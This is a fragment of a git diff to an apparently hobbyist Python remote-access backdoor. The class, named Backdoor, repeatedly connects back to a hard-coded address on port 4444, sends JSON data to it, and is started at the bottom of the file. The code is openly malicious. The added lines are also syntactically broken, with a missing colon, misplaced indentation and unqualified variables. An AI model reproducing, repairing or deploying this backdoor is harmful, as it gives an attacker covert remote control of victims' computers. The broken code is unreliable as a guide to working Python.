@@ -30,14 +30,24 @@ def UkDecode(text):
 
 class Backdoor:
     def __init__(self, ip, port):
-        con_status = False
-        while not con_status:
+        self.ip = ip
+        self.port = port
+        self.connection = None
             try:
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.connection.connect((ip, port))
                 con_status = True
             except:
                 time.sleep(3)
+
+    
+    def connect(self)
+        while not connection:
+            try:
+                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.connection.connect((ip, port))
+            except: time.sleep(3)
+
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -179,5 +189,5 @@ def playGimn():
 # webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
 
 
-my_backdoor = Backdoor("192.168.0.199", 4444)
+my_backdoor = Backdoor("192.168.0.108", 4444)
 my_backdoor.run()
